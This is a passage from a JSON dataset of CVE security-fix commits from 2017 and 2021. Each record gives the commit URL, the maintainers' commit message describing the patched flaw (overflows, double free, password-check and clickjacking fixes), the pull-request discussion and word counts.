 pointer operand  and  the  result  point  to  elements  of  the  same  array  object,  or  \r\n> one  past  the  last element of the array object, the evaluation shall not produce an overflow; \r\n> otherwise, the behavior is undefined.  Updated as suggested.\r\n Note for whoever is merging this: this should be backported to 1.10. @pfalcon can you backport and submit to 1.10 branch? > can you backport and submit to 1.10 branch?\r\n\r\nSubmitted as https://github.com/zephyrproject-rtos/zephyr/pull/6169, thanks.",
            "pr_title_words": 7,
            "comments_words": 273,
            "total_other_info_words": 280
        },
        {
            "cve-id": "CVE-2017-6801",
            "commit_url": "https://github.com/Yeraze/ytnef/commit/3cb0f914d6427073f262e1b2b5fd973e3043cdf7",
            "commit_msg": "BugFix - Potential OOB with Fields of Size 0\n\nThanks to @hannob for contributing a malformed TNEF stream with\na Version field of size 0.  Now such files will return an error\nindicating invalid data.",
            "commit_msg_words": 35,
            "other_info": "BugFix - data length error The long -> int change looks reasonable to me, but I don't consider my C knowledge to be too good to actually act as a reviewer ;) \r\n\r\nWhat I do notice is the lack of warning reporting in general. You should use -Wall at the very least. In Debian I actually add -Wextra as well and the result is... interesting. Fedora has patches to silence all of these.  I do that myself regularly as a first-step static analysis (and I run cppcheck regularly).  All I see is some rather harmless 'unused parameters' and 'comparing int & unsigned int' warnings, nothing I consider too harmful.\r\n\r\nAre you seeing something more serious? Finally, these two new issues could probably get additional CVE numbers. I requested the others for you and can do these two as well, but you can do it using the mitre web form at https://cveform.mitre.org/ Re: warnings, no. It's just I'm unused to seeing a project not using at least -Wall. I'm unsure if any of them are actually potentially dangerous or can cause problems.",
            "pr_title_words": 5,
            "comments_words": 176,
            "total_other_info_words": 181
        },
        {
            "cve-id": "CVE-2017-7395",
            "commit_url": "https://github.com/TigerVNC/tigervnc/commit/bf3bdac082978ca32895a4b6a123016094905689",
            "commit_msg": "Fix crash from integer overflow in SMsgReader::readClientCutText\n\nThe length sent by client is U32, but is converted into int. If it was bigger than 0x7fffffff the resulting int is negative, it passes the check against maxCutText and later throws std::bad_alloc from CharArray which takes down the whole server.\n\nAll the Streaming API deals with lengths in ints, so we can't tell it to skip that big amount of data. And it is not realistic to expect more than 2GB of clipboard data anyway. So lets just throw rdr::Exception that will disconnect this client and keep the server alive.",
            "commit_msg_words": 98,
            "other_info": "Fixes This is CVE-2017-7395 and CVE-2017-7396 .\r\n\r\nSpecifically CVE-2017-7395 is assigned for https://github.com/TigerVNC/tigervnc/pull/436/commits/bf3bdac082978ca32895a4b6a123016094905689 and CVE-2017-7396 for https://github.com/TigerVNC/tigervnc/pull/436/commits/dccb5f7d776e93863ae10bbff56a45c523c6eeb0",
            "pr_title_words": 1,
            "comments_words": 16,
            "total_other_info_words": 17
        }
    ],
    "2021": [
        {
            "cve-id": "CVE-2021-29978",
            "commit_url": "https://github.com/mozilla-mobile/mozilla-vpn-client/commit/c8440f464a2f5c4e7d4990152ee5850df8b23f42",
            "commit_msg": "Add rebase",
            "commit_msg_words": 2,
            "other_info": "FVP-02 WP5: Harden android",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2021-29458",
            "commit_url": "https://github.com/Exiv2/exiv2/commit/9b7a19f957af53304655ed1efe32253a1b11a8d0",
            "commit_msg": "Fix integer overflow.",
            "commit_msg_words": 3,
            "other_info": "Fix integer overflow @Mergifyio backport main **Command `backport main`: success**\n> **Backports have been created**\n> * [#1622 Fix integer overflow (backport #1539)](https://github.com/Exiv2/exiv2/pull/1622) has been created for branch `main`",
            "pr_title_words": 3,
            "comments_words": 26,
            "total_other_info_words": 29
        },
        {
            "cve-id": "CVE-2021-37155",
            "commit_url": "https://github.com/wolfSSL/wolfssl/commit/73076940af8904f98eee085994c176fe1876b95a",
            "commit_msg": "Fix CompareOcspReqResp.\n\nThere was a bug in this function that could cause a match to be reported even\nwhen the OCSP request and response in fact had a mismatch.",
            "commit_msg_words": 29,
            "other_info": "Fix CompareOcspReqResp. @haydenroche5 , this PR now appears to be causing failures in master with --enable-all?\r\n\r\n```\r\n./configure --enable-all && make\r\n\r\n./scripts/unit.test\r\nstarting unit tests...\r\n\r\n-----------------Porting tests------------------\r\n Begin API Tests\r\n   wolfSSL_Init(): passed\r\n   wolfSSL_CTX_use_certificate_buffer(): passed\r\n   wolfSSL_CertManagerCheckOCSPResponse():\r\nERROR - tests/api.c line 1254 failed with:\r\n    expected: wolfSSL_CertManagerCheckOCSPResponse(cm, response, sizeof(response), ((void *)0), status, entry, request) == WOLFSSL_SUCCESS\r\n    result:   -367 != 1\r\n```\r\n\r\nGuessing it has to do with the date in the captured OCSP response? Can you look into this? Thanks This also appears to be the same issue without having to do enable all:\r\n\r\n```\r\n./configure --enable-jni && make\r\n\r\n./tests/unit.test\r\nERROR - tests/api.c line 1254 failed with:\r\n    expected: wolfSSL_CertManagerCheckOCSPResponse(cm, response, sizeof(response), ((void *)0), status, entry, request) == WOLFSSL_SUCCESS\r\n    result:   -367 != 1\r\nzsh: abort      ./scripts/unit.test\r\n``` For anyone else late to the party it seems the test failure got addressed in 822aa92fccf77558e250131c1c6e9bb84d07afe8",
            "pr_title_words": 2,
            "comments_words": 137,
            "total_other_info_words": 139
        },
        {
            "cve-id": "CVE-2021-32695",
            "commit_url": "https://github.com/nextcloud/android/commit/97d6f2954c879f3bfebcd241993147bced5fd50b",
            "commit_msg": "prevent upload from sensitive path\n\nSigned-off-by: tobiasKaminsky <tobias@kaminsky.me>",
            "commit_msg_words": 8,
            "other_info": "prevent upload from sensitive path APK file: https://www.kaminsky.me/nc-dev/android-artifacts/8433.apk <br/><br/> ![qrcode](https://www.kaminsky.me/nc-dev/android-artifacts/8433.png) <br/><br/>To test this change/fix you can simply download above APK file and install and test it in parallel to your existing Nextcloud app.  <h1>Codacy</h1> <h1>Lint</h1><table width='500' cellpadding='5' cellspacing='2'><tr class='tablerow0'><td>Type</td><td><a href='https://www.kaminsky.me/nc-dev/android-lint/master.html'>master</a></td><td><a href='https://www.kaminsky.me/nc-dev/android-lint/1354.html'>PR</a></td></tr><tr class='tablerow1'><td>Warnings</td><td>234</td><td>234</td></tr><tr class='tablerow0'><td>Errors</td><td>0</td><td>0</td></tr></table> <h1><a href='https://www.kaminsky.me/nc-dev/android-findbugs/1354.html'>SpotBugs</a> (new)</h1><table width='500' cellpadding='5' cellspacing='2'><tr class='tableheader'><th align='left'>Warning Type</th><th align='right'>Number</th></tr><tr class='tablerow0'><td>Bad practice Warnings</td><td align='right'>27</td></tr><tr class='tablerow1'><td>Correctness Warnings</td><td align='right'>51</td></tr><tr class='tablerow0'><td>Internationalization Warnings</td><td align='right'>9</td></tr><tr class='tablerow1'><td>Multithreaded correctness Warnings</td><td align='right'>9</td></tr><tr class='tablerow0'><td>Performance Warnings</td><td align='right'>72</td></tr><tr class='tablerow1'><td>Security Warnings</td><td align='right'>40</td></tr><tr class='tablerow0'><td>Dodgy code Warnings</td><td align='right'>98</td></tr><tr class='tablerow1'><td><b>Total</b></td><td align='right'><b>306</b></td></tr></table> <h1><a href='https://www.kaminsky.me/nc-dev/android-findbugs/master.html'>SpotBugs</a> (master)</h1><table width='500' cellpadding='5' cellspacing='2'><tr class='tableheader'><th align='left'>Warning Type</th><th align='right'>Number</th></tr><tr class='tablerow0'><td>Bad practice Warnings</td><td align='right'>27</td></tr><tr class='tablerow1'><td>Correctness Warnings</td><td align='right'>51</td></tr><tr class='tablerow0'><td>Internationalization Warnings</td><td align='right'>9</td></tr><tr class='tablerow1'><td>Multithreaded correctness Warnings</td><td align='right'>9</td></tr><tr class='tablerow0'><td>Performance Warnings</td><td align='right'>72</td></tr><tr class='tablerow1'><td>Security Warnings</td><td align='right'>40</td></tr><tr class='tablerow0'><td>Dodgy code Warnings</td><td align='right'>98</td></tr><tr class='tablerow1'><td><b>Total</b></td><td align='right'><b>306</b></td></tr></table>      master-IT test failed, but no output was generated. Maybe a preliminary stage failed.  master-Unit test failed: https://www.kaminsky.me/nc-dev/android-integrationTests/1354-IT-master-06-16  /backport to stable-3.16",
            "pr_title_words": 5,
            "comments_words": 130,
            "total_other_info_words": 135
        },
        {
            "cve-id": "CVE-2021-35938",
            "commit_url": "https://github.com/rpm-software-management/rpm/commit/25a435e90844ea98fe5eb7bef22c1aecf3a9c033",
            "commit_msg": "Set file metadata via fd-based ops for everything but symlinks\n\nRegular file ops are fd-based already, for the rest we need to open them\nmanually. Files with temporary suffix must never be followed, for\ndirectories (and pre-existing FA_TOUCHed files) use the rpm symlink\n\"root or target owner allowed\" rule wrt following.\n\nThis mostly fixes CVE-2021-35938, but as we're not yet using dirfd-based\noperatiosn for everything there are corner cases left undone. And then\nthere's the plugin API which needs updating for all this.",
            "commit_msg_words": 83,
            "other_info": "First steps towards fixing the symlink CVEs It should be noted (probably in the commit message too) that as these symlink CVE's overlap and interact in various ways, this does not fully fix CVE-2021-35939 as the directory tracking does not cover all our installation steps yet. Plugging all the holes requires converting *all* of FSM to the *at() family of calls plus fd-based ops where possible, so this really is just the first step of many to come. I'm quite aware of Linux having all manner of fancy extensions available.\r\nRpm is portable software and we need to fix this stuff using what's available in POSIX, utilizing non-portable extensions would only make things far more complicated rather than help. There's enough complexities to deal with as it is, thank you very much. This is now using fd or dirfd+basename for file ops within the fsm, as much as possible. Plugins pose special problems as external libraries generally dont support dirfd+basename style operation, but may still need to operate on symlinks so we're stuck with \"insecure\" absolute paths there, for now at least.\r\n\r\nI'm seeing a couple of install glitches on fresh chroot install still, but it's getting close now.\r\nOf course a change this big and drastic *will* have bugs in it initially, I have no illusions about that.\r\n\r\n(edit: hmph, the test-suite was passing just a minute ago...) Okay, test-suite + all my local tests (install to empty chroot etc) pass now :partying_face:  > This is now using fd or dirfd+basename for file ops within the fsm, as much as possible. Plugins pose special problems as external libraries generally dont support dirfd+basename style operation, but may still need to operate on symlinks so we're stuck with \"insecure\" absolute paths there, for now at least.\r\n\r\nCute (but non-portable) trick: use paths of the form `/dev/fd/$FDNUM/something`.  Works at least on Linux. Yeah once we have the basics working and optimized to a reasonable degree we can start looking at utilizing various OS-specific extensions. The gotcha with those is to find ways to provide extra functionality in the specific OS'es *without* introducing multiple codepaths (which will inevitably bitrot) to accomplish the same thing. Anyway...\r\n\r\nThere will inevitably be bugs in this all, and since the test-suite covers only so much the best way to find the rest is real-world testing. And sitting in a branch does little to achieve that, so I'm merging this as is now.\r\n\r\nDanger Will Robinson, if you're in the habbit of running rpm daily snapshots then you'll want to stay alert for a while. Oh, and to make it absolutely clear: we're nowhere *near* done with this, I just want to get this bulk of change over with so we can concentrate with the finer nuances. @pmatilai  Thanks for fixing these CVEs.  And I want to double check with you that \r\ndoes these 32 commits in this pull request fully fix CVE-2021-35937, CVE-2021-35938, CVE-2021-35939? \r\nAny plan to porting it to 4.17.x branch? There will be no backports.",
            "pr_title_words": 7,
            "comments_words": 493,
            "total_other_info_words": 500
        },
        {
            "cve-id": "CVE-2021-32792",
            "commit_url": "https://github.com/OpenIDC/mod_auth_openidc/commit/55ea0a085290cd2c8cdfdd960a230cbc38ba8b56",
            "commit_msg": "Add a function to escape Javascript characters",
            "commit_msg_words": 7,
            "other_info": "Add a function to escape Javascript characters",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2021-41715",
            "commit_url": "https://github.com/libsixel/libsixel/commit/d299d67c532a5133a57aade5c35ff8e612c73dd8",
            "commit_msg": "sixel_encoder_prepare_palette: kill use-after-free\n\nThe only place sixel_encoder_prepare_palette() is called\nfrom is sixel_encoder_encode_frame(). If we have a\nSIXEL_FAILED result inside the former, we unref the palette,\npotentially freeing it. We then goto the error path for\nsixel_encoder_encode_frame(), where we unref it again, in a\nclassic double-free. Remove the internal unref. As noted,\nthis is a single call site, so removing the unref can't\ncause a memory leak.\n\nCloses #27, reported by a4865g (\"WuLearn\").",
            "commit_msg_words": 72,
            "other_info": "sixel_encoder_prepare_palette: kill use-after-free @a4865g",
            "pr_title_words": 3,
            "comments_words": 1,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2021-36146",
            "commit_url": "https://github.com/projectacrn/acrn-hypervisor/commit/330359921e2e4c2f3f3a10b5bab86942d63c4428",
            "commit_msg": "DM: xHCI: Check trb pointer before use it\n\nThe trb pointer may be NULL when get the address from user space, add\nthe pointer check before use the trb.\n\nTracked-On: #6172\nSigned-off-by: Liu Long <long.liu@intel.com>\nReviewed-by: Shuo A Liu <shuo.a.liu@intel.com>\nAcked-by: Yu Wang <yu1.wang@intel.com>",
            "commit_msg_words": 44,
            "other_info": "DM: xHCI: Check trb pointer before use it No new violations to the coding guideline detected.<br>No New Name Conflict<br>No New Function Declaration/Definition Mismatch OK to verify",
            "pr_title_words": 8,
            "comments_words": 18,
            "total_other_info_words": 26
        },
        {
            "cve-id": "CVE-2021-37501",
            "commit_url": "https://github.com/HDFGroup/hdf5/commit/6463322c70b1080aba687fc61c5eaa0a0a3f3be9",
            "commit_msg": "Remove duplicate code\n\nSigned-off-by: Egbert Eich <eich@suse.com>",
            "commit_msg_words": 7,
            "other_info": "Check for overflow when calculating on-disk attribute data size Thanks for merging!\r\n@byrnHDF , @vchoi-hdfgroup , @derobins , @lrknox would you like me to add reproducers for CVEs we had fixed earlier as well? I can give it a go, but would only do so if there is interest. Does the change will merge to 1.8 branch or does the hdf5 1.8.21 have the issue? Thanks!",
            "pr_title_words": 9,
            "comments_words": 57,
            "total_other_info_words": 66
        },
        {
            "cve-id": "CVE-2021-3652",
            "commit_url": "https://github.com/389ds/389-ds-base/commit/ec4d65e5d6c5310c990a2cfe161d52f5f574f337",
            "commit_msg": "Issue 4817 - BUG - locked crypt accounts on import may allow all passwords\n\nBug Description: Due to mishanding of short dbpwd hashes, the\ncrypt_r algorithm was misused and was only comparing salts\nin some cases, rather than checking the actual content\nof the password.\n\nFix Description: Stricter checks on dbpwd lengths to ensure\nthat content passed to crypt_r has at least 2 salt bytes and\n1 hash byte, as well as stricter checks on ct_memcmp to ensure\nthat compared values are the same length, rather than potentially\nallowing overruns/short comparisons.\n\nfixes: https://github.com/389ds/389-ds-base/issues/4817\n\nAuthor: William Brown <william@blackhats.net.au>\n\nReview by: ???",
            "commit_msg_words": 100,
            "other_info": "Issue 4817 - BUG - locked crypt accounts on import may allow all passwords Does this also cover the other crypt schemes?  crypt-md5, etc.. Kind of - the other schemes aren't affected by this because of their algo prefixing as detailed in man crypt_r here:\r\n\r\n```\r\nIf salt is a character string starting with the characters \"$id$\" followed by a string terminated by \"$\":\r\n\r\n$id$salt$encrypted\r\nthen instead of using the DES machine, id identifies the encryption method used and this then determines how the rest of the password string is interpreted. The following values of id are supported:\r\nSo $5$salt$encrypted is an SHA-256 encoded password and $6$salt$encrypted is an SHA-512 encoded one.\r\n```\r\n\r\nHowever, they would still potentially have had the issue with hash truncation due to the missing length check before ct_memcmp. I'm not sure how this could be actually attacked though for the other hash types. \r\n\r\n @mreynolds389 reminder :)  LGTM ```\r\nTo github.com:389ds/389-ds-base.git\r\n   804b46e06..18271bad6  389-ds-base-1.4.3 -> 389-ds-base-1.4.3\r\nTo github.com:389ds/389-ds-base.git\r\n   5d956fcc7..c1926dfc6  389-ds-base-1.4.4 -> 389-ds-base-1.4.4\r\n```",
            "pr_title_words": 14,
            "comments_words": 152,
            "total_other_info_words": 166
        },
        {
            "cve-id": "CVE-2021-4076",
            "commit_url": "https://github.com/latchset/tang/commit/e82459fda10f0630c3414ed2afbc6320bb9ea7c9",
            "commit_msg": "keys: move signing part out of find_by_thp() and to find_jws() (#81)\n\nHandle just signing keys in find_jws(), to make sure we are\r\nresponding only to proper queries.\r\n\r\nTests were also failing to detect this issue and were updated\r\naccordingly.\r\n\r\nIssue discovered by Twitter Kernel and OS team during a source\r\ncode audit while evaluating Tang/Clevis for their needs.\r\n\r\nFixes CVE-2021-4076",
            "commit_msg_words": 60,
            "other_info": "keys: move signing part out of find_by_thp() and to find_jws() ## [Codecov](https://app.codecov.io/gh/latchset/tang/pull/81?dropdown=coverage&src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=latchset) Report\nAttention: Patch coverage is `63.63636%` with `4 lines` in your changes missing coverage. Please review.\n> Project coverage is 57.35%. Comparing base [(`1d1874b`)](https://app.codecov.io/gh/latchset/tang/commit/1d1874b40d38a0eef788dd630af0a08e0ecda899?dropdown=coverage&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=latchset) to head [(`3503270`)](https://app.codecov.io/gh/latchset/tang/commit/3503270a0b85e16ccd4a6f078a65d62d192df127?dropdown=coverage&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=latchset).\n> Report is 34 commits behind head on master.\n\n| [Files with missing lines](https://app.codecov.io/gh/latchset/tang/pull/81?dropdown=coverage&src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=latchset) | Patch % | Lines |\n|---|---|---|\n| [src/keys.c](https://app.codecov.io/gh/latchset/tang/pull/81?src=pr&el=tree&filepath=src%2Fkeys.c&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=latchset#diff-c3JjL2tleXMuYw==) | 63.63% | [2 Missing and 2 partials :warning: ](https://app.codecov.io/gh/latchset/tang/pull/81?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=latchset) |\n\n<details><summary>Additional details and impacted files</summary>\n\n\n```diff\n@@            Coverage Diff             @@\n##           master      #81      +/-   ##\n==========================================\n+ Coverage   56.10%   57.35%   +1.24%     \n==========================================\n  Files           3        3              \n  Lines         401      401              \n  Branches      115      114       -1     \n==========================================\n+ Hits          225      230       +5     \n+ Misses         90       88       -2     \n+ Partials       86       83       -3     \n```\n\n</details>\n\n[:umbrella: View full report in Codecov by Sentry](https://app.codecov.io/gh/latchset/tang/pull/81?dropdown=coverage&src=pr&el=continue&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=latchset).   \n:loudspeaker: Have feedback on the report? [Share it here](https://about.codecov.io/codecov-pr-comment-feedback/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=latchset).",
            "pr_title_words": 10,
            "comments_words": 130,
            "total_other_info_words": 140
        },
        {
            "cve-id": "CVE-2021-20299",
            "commit_url": "https://github.com/AcademySoftwareFoundation/openexr/commit/25e9515b06a6bc293d871622b8cafaee7af84e0f",
            "commit_msg": "add sanity check for reading multipart files with no parts (#840)\n\nSigned-off-by: Peter Hillman <peterh@wetafx.co.nz>",
            "commit_msg_words": 15,
            "other_info": "add sanity check for reading multipart files with no parts",
            "pr_title_words": 10,
            "comments_words": 0,
            "total_other_info_words": 10
        },
        {
            "cve-id": "CVE-2021-44550",
            "commit_url": "https://github.com/stanfordnlp/CoreNLP/commit/5ee097dbede547023e88f60ed3f430ff09398b87",
            "commit_msg": "Address issue #1222: verify that classifier and outputFormat are valid values before returning them in headers.  Should sanitize malicious output",
            "commit_msg_words": 20,
            "other_info": "4.4.0 update",
            "pr_title_words": 2,
            "comments_words": 0,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2021-33430",
            "commit_url": "https://github.com/numpy/numpy/commit/16f7824b4d935b6aee98298ca4123d57174a6f2e",
            "commit_msg": "BUG: fix potential buffer overflow(#18939)",
            "commit_msg_words": 5,
            "other_info": "BUG: fix potential buffer overflow(#18939) Thanks @yetanothercheer .",
            "pr_title_words": 5,
            "comments_words": 3,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2021-33910",
            "commit_url": "https://github.com/systemd/systemd/commit/441e0115646d54f080e5c3bb0ba477c892861ab9",
            "commit_msg": "basic/unit-name: do not use strdupa() on a path\n\nThe path may have unbounded length, for example through a fuse mount.\n\nCVE-2021-33910: attacked controlled alloca() leads to crash in systemd and\nultimately a kernel panic. Systemd parses the content of /proc/self/mountinfo\nand each mountpoint is passed to mount_setup_unit(), which calls\nunit_name_path_escape() underneath. A local attacker who is able to mount a\nfilesystem with a very long path can crash systemd and the whole system.\n\nhttps://bugzilla.redhat.com/show_bug.cgi?id=1970887\n\nThe resulting string length is bounded by UNIT_NAME_MAX, which is 256. But we\ncan't easily check the length after simplification before doing the\nsimplification, which in turns uses a copy of the string we can write to.\nSo we can't reject paths that are too long before doing the duplication.\nHence the most obvious solution is to switch back to strdup(), as before\n7410616cd9dbbec97cf98d75324da5cda2b2f7a2.",
            "commit_msg_words": 138,
            "other_info": "basic/unit-name: do not use strdupa() on a path is it possible to move to strdup() in case of large size only? strdupa() could have been used for performance. before this patch merged our docker images doesn't have any high or medium issues, \r\n\r\nbut from yesterday after this patch got merged it is causing high vulnerability issues with docker image and making our jobs fail https://ubuntu.com/security/CVE-2021-33910\r\n\r\ncan someone suggest how to fix this ? @nagaa13 I doubt anyone is able to help if you don't provide any details. we have a circle ci job where it will test for the docker images vulnerabilities every day,\r\nfor which our job reported below;\r\n\r\nScan Findings\r\nCritical:   0\r\nHigh:       1\r\nMedium:     18\r\nLow:        45\r\nInfo:       18\r\nUndefined:  0\r\n\r\nSaving all findings to findings.json...\r\nFound Docker image contains vulnerabilities at CRITICAL or HIGH level\r\n\r\nfor which the high issue is https://ubuntu.com/security/CVE-2021-33910\r\n\r\n<img width=\"1288\" alt=\"Screen Shot 2021-07-21 at 3 34 18 PM\" src=\"https://user-images.githubusercontent.com/86254629/126549023-e63c831b-31dd-4898-8023-6af3fb625e3d.png\">\r\n @nagaa13  this isn't a support forum, contact your distro vendor for help.\r\n\r\nThis PR *fixes* a potential stack overflow bug, it's not the cause of your problems, but it coincides with the CVE likely behind your alerts because it fixes that bug.\r\n\r\nThere's nothing to be done here for you. Right, you probably should rebuild your docker images to include a fixed systemd Has this been released?\r\n\r\nedit: based on the [master branch](https://github.com/keszybz/systemd/blob/master/src/basic/unit-name.c#L386) looks like it has not. Is there an estimated date to release this? > Has this been released?\r\n> \r\n> edit: based on the [master branch](https://github.com/keszybz/systemd/blob/master/src/basic/unit-name.c#L386) looks like it has not. Is there an estimated date to release this?\r\n\r\nThe branch you referenced is 1) from a fork 2) is a legacy `master` branch (we use `main` for quite a while).\r\n\r\nAnyway, it's been part of the `main` branch for ~five months https://github.com/systemd/systemd/blob/e67e6691e57c446e9f2bbc3c5edfa74ce45ab41d/src/basic/unit-name.c#L388\r\nand is included in all v250-rcX tags.",
            "pr_title_words": 8,
            "comments_words": 302,
            "total_other_info_words": 310
        },
        {
            "cve-id": "CVE-2021-32559",
            "commit_url": "https://github.com/mhammond/pywin32/commit/b860822ad233304fceefc4644bd353087a5309ec",
            "commit_msg": "PyACL - Fixing integer overflows that occur when resizing ACLs\n\nFixes #1700\nCVE-2021-32559",
            "commit_msg_words": 13,
            "other_info": "PyACL - Fixing integer overflows that occur when resizing ACLs",
            "pr_title_words": 10,
            "comments_words": 0,
            "total_other_info_words": 10
        },
        {
            "cve-id": "CVE-2021-40529",
            "commit_url": "https://github.com/randombit/botan/commit/9a23e4e3bc3966340531f2ff608fa9d33b5185a2",
            "commit_msg": "Avoid using short exponents with ElGamal\n\nSome off-brand PGP implementation generates keys where p - 1 is\nsmooth, as a result short exponents can leak enough information about\nk to allow decryption.",
            "commit_msg_words": 32,
            "other_info": "Avoid using short exponents with ElGamal # [Codecov](https://codecov.io/gh/randombit/botan/pull/2790?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jack+Lloyd) Report\n> Merging [#2790](https://codecov.io/gh/randombit/botan/pull/2790?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jack+Lloyd) (9a23e4e) into [master](https://codecov.io/gh/randombit/botan/commit/f63555c7cd14eb457aee173b31e5d50c959677fc?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jack+Lloyd) (f63555c) will **increase** coverage by `0.01%`.\n> The diff coverage is `100.00%`.\n\n[![Impacted file tree graph](https://codecov.io/gh/randombit/botan/pull/2790/graphs/tree.svg?width=650&height=150&src=pr&token=VR6iYmSPH8&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jack+Lloyd)](https://codecov.io/gh/randombit/botan/pull/2790?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jack+Lloyd)\n\n```diff\n@@            Coverage Diff             @@\n##           master    #2790      +/-   ##\n==========================================\n+ Coverage   92.32%   92.33%   +0.01%     \n==========================================\n  Files         568      568              \n  Lines       63086    63086              \n  Branches     6180     6178       -2     \n==========================================\n+ Hits        58244    58251       +7     \n+ Misses       4810     4803       -7     \n  Partials       32       32              \n```\n\n\n| [Impacted Files](https://codecov.io/gh/randombit/botan/pull/2790?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jack+Lloyd) | Coverage \u0394 | |\n|---|---|---|\n| [src/lib/pubkey/elgamal/elgamal.cpp](https://codecov.io/gh/randombit/botan/pull/2790/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jack+Lloyd#diff-c3JjL2xpYi9wdWJrZXkvZWxnYW1hbC9lbGdhbWFsLmNwcA==) | `95.94% <100.00%> (\u00f8)` | |\n| [src/lib/pubkey/dl\\_group/dl\\_group.cpp](https://codecov.io/gh/randombit/botan/pull/2790/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jack+Lloyd#diff-c3JjL2xpYi9wdWJrZXkvZGxfZ3JvdXAvZGxfZ3JvdXAuY3Bw) | `92.65% <0.00%> (+1.04%)` | :arrow_up: |\n| [src/lib/asn1/der\\_enc.cpp](https://codecov.io/gh/randombit/botan/pull/2790/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jack+Lloyd#diff-c3JjL2xpYi9hc24xL2Rlcl9lbmMuY3Bw) | `83.22% <0.00%> (+2.48%)` | :arrow_up: |\n\n------\n\n[Continue to review full report at Codecov](https://codecov.io/gh/randombit/botan/pull/2790?src=pr&el=continue&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jack+Lloyd).\n> **Legend** - [Click here to learn more](https://docs.codecov.io/docs/codecov-delta?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jack+Lloyd)\n> `\u0394 = absolute <relative> (impact)`, `\u00f8 = not affected`, `? = missing data`\n> Powered by [Codecov](https://codecov.io/gh/randombit/botan/pull/2790?src=pr&el=footer&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jack+Lloyd). Last update [f63555c...9a23e4e](https://codecov.io/gh/randombit/botan/pull/2790?src=pr&el=lastupdated&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jack+Lloyd). Read the [comment docs](https://docs.codecov.io/docs/pull-request-comments?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jack+Lloyd).\n Thank you for the ping @randombit !\n\nCC @ni4 @dewyatt @antonsviridenko @randombit what measures should be taken by rnp developers to address this issue?",
            "pr_title_words": 6,
            "comments_words": 167,
            "total_other_info_words": 173
        },
        {
            "cve-id": "CVE-2021-3660",
            "commit_url": "https://github.com/cockpit-project/cockpit/commit/8d9bc10d8128aae03dfde62fd00075fe492ead10",
            "commit_msg": "common: Restrict frame embedding to same origin\n\nDeclare `X-Frame-Options: sameorigin` [1] so that cockpit frames can\nonly be embedded into pages coming from the same origin. This is similar\nto setting CORP in commit 2b38b8de92f9a (which applies to `<script>`,\n`<img>`, etc.).\n\nThe main use case for embedding is to run cockpit-ws behind a reverse\nproxy, while also serving other pages. Cross-origin embedding is\ndiscouraged these days to prevent \"clickjacking\".\n\nCross-origin embedding already did not work in most cases: Frames would\nalways just show the login page.  However, this looks confusing and is\nunclean. With X-Frame-Options, the browser instead shows an explanatory\nerror page.\n\nMention the same origin requirement in the embedding documentation.\n\nFixes #16122\nhttps://bugzilla.redhat.com/show_bug.cgi?id=1980688\nCVE-2021-3660\n\n[1] https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options",
            "commit_msg_words": 118,
            "other_info": "common: Restrict frame embedding to same origin Darn, when writing the `STATIC_HEADERS_CHUNKED` hack I already had a hunch that assuming glib hash ordering would backfire -- and [it did](https://logs.cockpit-project.org/logs/pull-16342-20210914-072625-784e2518-rhel-8-5/log.html).\r\n\r\nI filed PR #16346 to land the test/example fixes, and will rework test-httpstream to be more robust against header changes. I tried very hard again today to actually exploit this, but still did not get very far. I now left the description sufficiently vague, and I think this is ready to land despite not having fully confirmed the original scenario. See https://bugzilla.redhat.com/show_bug.cgi?id=1980688#c19 for details.\r\n\r\n@mvollmer, want to have a look? Updated title and comment for release notes",
            "pr_title_words": 7,
            "comments_words": 99,
            "total_other_info_words": 106
        },
        {
            "cve-id": "CVE-2021-25931",
            "commit_url": "https://github.com/OpenNMS/opennms/commit/607151ea8f90212a3fb37c977fa57c7d58d26a84",
            "commit_msg": "NMS-13124: Fixed user deletion by renaming bug and CSRF privilege escalation issue",
            "commit_msg_words": 12,
            "other_info": "NMS-13124: Fixed user deletion by renaming bug and CSRF privilege escalation issue",
            "pr_title_words": 12,
            "comments_words": 0,
            "total_other_info_words": 12
        },
        {
            "cve-id": "CVE-2021-42553",
